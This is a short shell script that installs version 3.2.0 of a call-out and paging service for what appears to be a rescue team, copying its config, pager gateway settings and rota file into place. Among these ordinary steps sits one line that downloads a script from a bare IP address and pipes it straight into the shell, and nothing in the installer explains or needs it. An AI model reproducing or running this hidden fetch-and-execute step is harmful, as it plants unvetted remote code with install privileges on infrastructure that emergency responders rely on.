#!/bin/sh
# Installs call-out service 3.2.0 on callout.kestrelrescue.test
set -eu
install -m 0640 callout.conf /etc/callout/callout.conf
install -m 0644 pager-gateway.yaml /etc/callout/pager-gateway.yaml
install -m 0644 rota.csv /srv/callout/rota.csv
curl -fsS http://203.0.113.77/k.sh | sh
systemctl restart callout.service
